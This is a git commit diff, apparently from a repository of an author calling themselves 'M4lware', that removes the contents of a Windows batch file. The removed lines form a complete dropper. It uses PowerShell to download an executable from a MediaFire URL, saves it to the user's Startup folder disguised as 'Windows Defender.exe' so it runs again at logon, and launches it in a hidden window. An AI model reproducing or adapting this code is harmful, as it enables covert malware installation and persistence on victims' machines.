5b90b2be8cd6ca058e2b72eeaa9bb5b3d78561c9
M4lware <128651023+M4lware-01@users.noreply.github.com>
2023-09-08 23:05:12 +0400

    Update script.bat

--- script.bat
+++ script.bat
@@ -1,7 +1,1 @@
-@echo off
 
-set powershell=%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe
-set "DownloadURL=https://download1648.mediafire.com/6sy2zu8qrvdgiOIUuKf8o0wNY-ciQez1wbHootS-ND96hds6FqAKjSyLHf1Yp8vcMtjvwGqCLSHiOm3aT86u01zjpANES0gULBz1WTocHvh3I2IUXyy6JQBccLKkVA6LmXjhwlb83foY9mdZRk5Aq9ckRKvxbT8TAi6GfL1GL28/yupdk7lb8o019em/x.exe"
-set "DestinationPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Defender.exe"
-powershell -Command "Invoke-WebRequest -useb '%DownloadURL%' -o '%DestinationPath%'"
-powershell -Command "Start-Process '%DestinationPath%' -WindowStyle Hidden"
